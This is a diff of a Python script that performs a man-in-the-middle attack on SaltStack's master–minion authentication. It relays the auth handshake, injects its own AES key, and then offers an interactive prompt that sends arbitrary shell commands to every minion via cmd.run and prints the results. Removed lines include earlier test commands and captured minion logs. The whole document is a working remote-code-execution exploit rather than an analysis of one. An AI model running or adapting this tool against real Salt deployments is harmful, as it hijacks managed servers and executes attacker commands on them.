@@ -1,8 +1,9 @@
 #!/usr/bin/env python
-import os
+import sys
 import argparse
 import tempfile
-import pickle
+import urlparse
+import random
 
 import zmq
 import msgpack
@@ -12,135 +13,116 @@ import salt.crypt
 
 
 parser = argparse.ArgumentParser(description="MitM's a minion's connection to a salt-master")
-parser.add_argument('--address', '-a', default='tcp://127.0.0.1:4507', help='A ZMQ-URL to bind the socket to')
 parser.add_argument('--master', '-m', default='tcp://127.0.0.1:4506', help='A ZMQ-URL pointing to the real salt-master')
+parser.add_argument('--address', '-a', default='tcp://127.0.0.1:4507', help='A ZMQ-URL to bind the socket to')
+parser.add_argument('--pub-address', '-p', default='tcp://127.0.0.1:4508', help='A ZMQ-URL to bind the pub socket to')
+
+log = lambda x: sys.stderr.write(x + "\n"); sys.stderr.flush()
 
 def proxy(client_socket, msg):
     client_socket.send(msgpack.dumps(msg))
     return msgpack.loads(client_socket.recv())
 
+def authenticate(args, server_socket, client_socket):
+    # Get the _auth packet
+    log('Waiting for an auth packet')
+    auth_packet = msgpack.loads(server_socket.recv())
+
+    # Parse the minion's public key
+    log("Parsing the minion's public key")
+    with tempfile.NamedTemporaryFile() as temp_pub_key:
+        temp_pub_key.write(auth_packet['load']['pub'])
+        temp_pub_key.flush()
+        pub_key = RSA.load_pub_key(temp_pub_key.name)
+
+    # Get the real response from the master
+    log('Getting the decryption of the token from the legitimate master')
+    master_response = proxy(client_socket, auth_packet)
+
+    # Generate our own AES key and send it to the client
+    log("Generating an AES key")
+    aes_key = salt.crypt.Crypticle.generate_key_string()
+
+    # Fudge some response parameters
+    master_response['aes'] = pub_key.public_encrypt(aes_key, 4)
+    master_response['publish_port'] = urlparse.urlparse(args.pub_address).port
+
+    log('Sending the AES key to the minion')
+    server_socket.send(msgpack.dumps(master_response))
+
+    return aes_key, pub_key
+
 def main(args):
+    log('Initializing ZMQ')
+    ctx = zmq.Context()
+
     # Initialize our server context
-    server_ctx = zmq.Context()
-    server_socket = server_ctx.socket(zmq.REP)
+    server_socket = ctx.socket(zmq.REP)
     server_socket.bind(args.address)
 
     # Initialize a client to the real salt-master
-    client_ctx = zmq.Context()
-    client_socket = client_ctx.socket(zmq.REQ)
+    client_socket = ctx.socket(zmq.REQ)
     client_socket.connect(args.master)
-    print 'start'
 
-    # Get the _auth packet
-    print 'auth'
-    auth_packet = msgpack.loads(server_socket.recv())
+    # Initialize our pub socket (for sending commands)
+    pub_socket = ctx.socket(zmq.PUSH)
+    pub_socket.bind(args.pub_address)
 
-    # Get the real response from the master
-    print 'getting resp from master'
-    response = proxy(client_socket, auth_packet)
-
-    # Parse the minion's public key
-    print 'parsing pub key'
-    with tempfile.NamedTemporaryFile() as temp_pub_key:
-        temp_pub_key.write(auth_packet['load']['pub'])
-        temp_pub_key.flush()
-        pub_key = RSA.load_pub_key(temp_pub_key.name)
-
-    # Generate our own AES key and send it to the client
-    aes_key = salt.crypt.Crypticle.generate_key_string()
+    log('Authenticating with the minion')
+    aes_key, pub_key = authenticate(args, server_socket, client_socket)
     crypticle = salt.crypt.Crypticle({}, aes_key)
-    response['aes'] = pub_key.public_encrypt(aes_key, 4)
-    response['publish_port'] = 4508
-    print 'sending aes key'
-    server_socket.send(msgpack.dumps(response))
 
-    print 'things'
+    log('Authenticating with the minion to send pillar info')
+    pillar_aes_key, _ = authenticate(args, server_socket, client_socket)
+    pillar_crypticle = salt.crypt.Crypticle({}, pillar_aes_key)
 
-
-    ## DEL
-    auth_packet = msgpack.loads(server_socket.recv())
-    print 'getting resp from master'
-    response = proxy(client_socket, auth_packet)
-
-    # Parse the minion's public key
-    print 'parsing pub key'
-    with tempfile.NamedTemporaryFile() as temp_pub_key:
-        temp_pub_key.write(auth_packet['load']['pub'])
-        temp_pub_key.flush()
-        pub_key = RSA.load_pub_key(temp_pub_key.name)
-
-    # Generate our own AES key and send it to the client
-    aes_key = salt.crypt.Crypticle.generate_key_string()
-    response['aes'] = pub_key.public_encrypt(aes_key, 4)
-    print 'sending aes key'
-    server_socket.send(msgpack.dumps(response))
-
-    pub_ctx = zmq.Context()
-    pub_socket = pub_ctx.socket(zmq.PUSH)
-    pub_socket.bind('tcp://127.0.0.1:4508')
-
-    print 'things'
-    crypticle2 = salt.crypt.Crypticle({}, aes_key)
-    things = msgpack.loads(server_socket.recv())
-    pillar = crypticle2.loads(things['load'])
+    log('Getting pillar info from the minion')
+    pillar_crypticle.loads(msgpack.loads(server_socket.recv())['load'])
     server_socket.send(msgpack.dumps({
         'enc': 'aes',
-        'key': pub_key.public_encrypt(aes_key, 4),
-        'pillar': crypticle2.dumps({}),
+        'key': pub_key.public_encrypt(pillar_aes_key, 4),
+        'pillar': pillar_crypticle.dumps({}),
     }))
-    print 'getting crap'
-    things = msgpack.loads(server_socket.recv())
-    print crypticle.loads(things['load'])
+
+    log('Waiting for a "minion_start" event')
+    crypticle.loads(msgpack.loads(server_socket.recv())['load'])
+
+    # shhhhh, it'll all be over soon
     server_socket.send(msgpack.dumps({
         'enc': 'aes',
         'load': crypticle.dumps(True),
     }))
 
-    print 'sending command'
-    pub_socket.send(msgpack.dumps({
-        'enc': 'aes',
-        'load': crypticle.dumps({
-            'tgt_type': 'glob',
-            'jid': '20121216060616356457',
-            'tgt': '*',
-            'ret': '',
-            'user': 'sudo_ubuntu',
-            'arg': ['wc -l /var/log/syslog'],
-            'fun': 'cmd.run',
-        }),
-    }))
-    print 'waiting for response'
-    things = msgpack.loads(server_socket.recv())
-    print crypticle.loads(things['load'])
-    server_socket.send(msgpack.dumps({
-        'enc': 'aes',
-        'load': crypticle.dumps(True),
-    }))
+    log("Minion ready to obey")
 
-    print 'sending command'
-    pub_socket.send(msgpack.dumps({
-        'enc': 'aes',
-        'load': crypticle.dumps({
-            'tgt_type': 'glob',
-            'jid': '20121216060616356458',
-            'tgt': '*',
-            'ret': '',
-            'user': 'sudo_ubuntu',
-            'arg': ['ls /tmp'],
-            'fun': 'cmd.run',
-        }),
-    }))
-    print 'waiting for response'
-    things = msgpack.loads(server_socket.recv())
-    print crypticle.loads(things['load'])
+    while True:
+        # Prompt the user for a command
+        command = raw_input('# ')
 
-    #received {'tgt_type': 'glob', 'jid': '20121216060616356454', 'tgt': '*', 'ret': '', 'user': 'sudo_ubuntu', 'arg': ['wc -l /var/log/syslog'], 'fun': 'cmd.run'}
-    #[INFO    ] User sudo_ubuntu Executing command cmd.run with jid 20121216060616356454
-    #[DEBUG   ] Command details {'tgt_type': 'glob', 'jid': '20121216060616356454', 'tgt': '*', 'ret': '', 'user': 'sudo_ubuntu', 'arg': ['wc -l /var/log/syslog'], 'fun': 'cmd.run'}
-    #[INFO    ] Executing command 'wc -l /var/log/syslog' in directory '/home/ubuntu'
-    #[DEBUG   ] output: 240 /var/log/syslog
-    #[INFO    ] Returning information for job: 20121216060616356454
-    #sending {'jid': '20121216060616356454', 'cmd': '_return', 'return': '240 /var/log/syslog', 'id': 'ip-10-240-16-152.ap-southeast-2.compute.internal', 'out': 'txt'}
+        # Send the command to the minion
+        pub_socket.send(msgpack.dumps({
+            'enc': 'aes',
+            'load': crypticle.dumps({
+                'tgt_type': 'glob',
+                'jid': str(random.randint(0, 1000000000)),
+                'tgt': '*',
+                'ret': '',
+                'user': 'sudo_ubuntu',
+                'arg': [command],
+                'fun': 'cmd.run',
+            }),
+        }))
+
+        # Fetch the result
+        result = crypticle.loads(msgpack.loads(server_socket.recv())['load'])
+        print result['return']
+
+        # Tell the minion we got the message
+        server_socket.send(msgpack.dumps({
+            'enc': 'aes',
+            'load': crypticle.dumps(True),
+        }))
+
 
 if __name__ == '__main__':
     args = parser.parse_args()
